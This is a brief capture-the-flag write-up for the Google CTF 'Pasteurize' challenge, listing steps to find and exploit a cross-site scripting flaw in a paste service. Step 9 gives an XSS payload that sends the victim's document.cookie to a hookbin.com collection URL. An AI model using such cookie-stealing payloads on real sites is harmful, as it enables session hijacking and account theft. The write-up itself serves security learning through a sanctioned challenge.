## Google CTF - Pasteurize ##
# // <-----------------> \\ #

  ^^ Done on : 27/02/21, ezyhcks ^^

		//>STEPS<//

	1. wget "https://pasteurize.web.ctfcompetition.com/source" 
	2. mv source source.js
	3. view source code to see how the program handles the parsing of "" and other stuff
	4. look a bit at the escape_string variable...
	5. open node in terminal
	6. play a bit with the JSON.stringify() command
	7. make a request.py file; give it the url, and set the contents to the XSS
	8. goto hookbin.com and get an entry point
	9. set content[]: ";new Image().src'(_hookbin_url_)?c='+document.cookie//"
	10. visit the note_id in the webpage and check with hookbin.com
	11. get the query string!

# // <-----------------> \\ # 
